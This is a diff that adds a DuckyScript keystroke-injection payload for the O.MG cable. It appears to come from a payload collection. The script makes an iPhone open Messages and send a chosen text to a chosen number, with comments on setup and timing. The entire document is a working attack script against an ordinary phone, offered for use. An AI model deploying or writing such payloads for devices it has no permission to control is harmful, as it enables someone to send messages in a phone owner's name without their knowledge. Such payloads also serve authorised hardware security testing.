@@ -1,0 +1,27 @@
+REM Version 1.0
+REM OS: iOS
+REM Author: Peaakss
+REM Description: A simple payload that sens a text message through iOS Messager
+REM NOTICE change text inside strings with "" to desried text | EXAMPLE | STRING 111-111-111
+REM NOITCE Payload was made on iOS 16.1 - iPhone| Timing may have have to be changed based on version/model
+REM NOTICE Lighting to USB-A or USB-C camera adapter is needed to run this payload, ative end of the O.MG cable must be plugged into the end of the converter
+
+GUI h
+DELAY 150
+GUI SPACE 
+DELAY 150
+BACKSPACE
+DELAY 150
+STRING Messages
+DELAY 250
+ENTER
+DELAY 200
+GUI n 
+DELAY 200
+STRING "PHONE NUMBER"
+DELAY 200
+TAB
+DELAY 200
+STRING "MESSAGE"
+DELAY 150
+ENTER
